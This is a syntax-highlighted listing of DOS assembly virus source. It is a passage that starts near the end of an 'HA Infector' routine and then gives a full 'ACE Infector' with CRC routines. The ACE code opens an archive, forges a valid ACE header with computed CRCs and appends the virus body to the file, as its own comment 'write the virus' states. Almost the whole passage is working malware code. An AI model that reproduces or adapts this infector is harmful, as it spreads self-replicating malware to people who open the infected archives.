</span><span class="sc6">shr</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">             </span><span class="sc1">; mov one byte of ax at right in bin</span><span class="sc0">
</span><span class="sc6">rcr</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                             </span><span class="sc1">; if anything lost , put it on dx</span><span class="sc0">

</span><span class="sc6">jae</span><span class="sc0">    </span><span class="sc5">anomality</span><span class="sc0">                        </span><span class="sc1">; if above or equal skip encrypt.</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">08320h</span><span class="sc0">            </span><span class="sc1">; encrypt value by a signature</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0EDB8h</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">anomality</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">loop</span><span class="sc0">   </span><span class="sc5">TableLowLoop</span><span class="sc0">         </span><span class="sc1">; make it 8 times</span><span class="sc0">

</span><span class="sc6">stosw</span><span class="sc0">                   </span><span class="sc1">; write ax</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">stosw</span><span class="sc0">                   </span><span class="sc1">; not write dx</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0">               </span><span class="sc1">; decrement the counter</span><span class="sc0">

</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">TableHighLoop</span><span class="sc0">           </span><span class="sc1">; repeat it until bp = 0</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">; last value equal 0</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">cld</span><span class="sc0">                 </span><span class="sc1">; clear direction flag          </span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">name1</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'yeye.ha'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">fin</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">betaname</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">starttable</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">1024</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
    
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">temporary1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">256</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">

</span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">HA</span><span class="sc0"> </span><span class="sc5">Infector</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0">

</span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ACE</span><span class="sc0"> </span><span class="sc5">Infector</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc0"> </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc5">it</span><span class="sc0"> </span><span class="sc5">with</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">appropried</span><span class="sc0"> </span><span class="sc9">name</span><span class="sc0"> </span><span class="sc5">file</span><span class="sc0"> </span><span class="sc4">)-</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0">

</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">tiny</span><span class="sc0">
</span><span class="sc9">.code</span><span class="sc0">
</span><span class="sc2">.286</span><span class="sc0">

</span><span class="sc9">org</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">

</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3d02h</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">name1</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                                         </span><span class="sc1">; open filename</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">temporary1</span><span class="sc0">                      </span><span class="sc1">; read 4 first bye put it into</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                                         </span><span class="sc1">; temporary</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">temporary1</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">; go to offset w,[02h]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gozero</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">256</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">temporary1</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                                         </span><span class="sc1">; read 256 bytes</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ace_header</span><span class="sc0">                                 </span><span class="sc1">; build a new ace_header</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">go</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">temporary1</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                                         </span><span class="sc1">; write the header</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">fin</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                                         </span><span class="sc1">; write the virus</span><span class="sc0">

</span><span class="sc5">ACE_invalid</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                                         </span><span class="sc1">; close the file</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">ACE_header</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">temporary1</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc2">01</span><span class="sc0">                          </span><span class="sc1">; set no compression</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">],</span><span class="sc2">8001h</span><span class="sc0">                       </span><span class="sc1">; no flags</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc5">fin</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc0">                   </span><span class="sc1">; virus as compress &amp; uncpss</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">                         </span><span class="sc1">; size</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">0Bh</span><span class="sc4">],</span><span class="sc5">fin</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">0Bh</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">fin</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">crc_calc</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">                                          </span><span class="sc1">; calc crc of the virus</span><span class="sc0">

</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">                                          </span><span class="sc1">; not ( not (ax)) = ax</span><span class="sc0">
</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">                      </span><span class="sc1">; save it here</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">set_a_name</span><span class="sc0">                                 </span><span class="sc1">; create new name without </span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                                          </span><span class="sc1">; Zero End</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">1Dh</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">                      </span><span class="sc1">; copy file size</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">02</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">02</span><span class="sc4">],</span><span class="sc2">1Fh</span><span class="sc0">                        </span><span class="sc1">; copy header size (1Fh+cx)</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">1Fh</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">betaname</span><span class="sc0">                          </span><span class="sc1">; </span><span class="sc0">

</span><span class="sc6">repz</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">                                      </span><span class="sc1">; copy name</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">crc_calc</span><span class="sc0">                                   </span><span class="sc1">; render header CRC</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">

</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">set_a_name</span><span class="sc4">:</span><span class="sc0">                                     </span><span class="sc1">; set a new name</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2Ch</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0000111100001111b</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0000111100001111b</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4141h</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">4141h</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">betaname</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">betaname</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">betaname</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc12">'C.'</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">betaname</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc12">'MO'</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">betaname</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">go</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">

</span><span class="sc5">gozero</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">42h</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">crc_calc</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">crc_table</span><span class="sc0">                          </span><span class="sc1">; calculate crc table</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0ffffh</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0ffffh</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc5">Crc_loop</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">lodsb</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">bh</span><span class="sc0">
</span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">02</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">

</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">Crc_loop</span><span class="sc0">

</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">crc_table</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">starttable</span><span class="sc4">+</span><span class="sc2">1024</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">  </span><span class="sc1">; the buffer table</span><span class="sc0">
                    </span><span class="sc1">; remember : It begin by the end</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">255</span><span class="sc0">               </span><span class="sc1">; set bp equal 255 </span><span class="sc0">
                    </span><span class="sc1">; 255 * 4 = 1024</span><span class="sc0">
</span><span class="sc6">std</span><span class="sc0">                 </span><span class="sc1">; set Direction Flag On</span><span class="sc0">
                    
</span><span class="sc5">TableHighloop</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">; the major loop in the Crc table Calc</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">                </span><span class="sc1">; set the minus loop to 8</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">               </span><span class="sc1">; dx = bp , major counter loop</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">               </span><span class="sc1">; ax = zero</span><span class="sc0">

</span><span class="sc5">TableLowLoop</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">shr</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">             </span><span class="sc1">; mov one byte of ax at right in bin</span><span class="sc0">
</span><span class="sc6">rcr</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">             </span><span class="sc1">; if anything losted , put it on dx</span><span class="sc0">

</span><span class="sc6">jae</span><span class="sc0">    </span><span class="sc5">anomality</span><span class="sc0">                        </span><span class="sc1">; if above or equal skip encrypt.</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">08320h</span><span class="sc0">            </span><span class="sc1">; encrypt value by a signature</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0EDB8h</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">anomality</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">loop</span><span class="sc0">   </span><span class="sc5">TableLowLoop</span><span class="sc0">         </span><span class="sc1">; make it 8 times</span><span class="sc0">

</span><span class="sc6">stosw</span><span class="sc0">                   </span><span class="sc1">; write ax</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">stosw</span><span class="sc0">                   </span><span class="sc1">; not write dx</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0">               </span><span class="sc1">; decrement the counter</span><span class="sc0">

</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">TableHighLoop</span><span class="sc0">           </span><span class="sc1">; repeat it until bp = 0</span><span class="sc0">

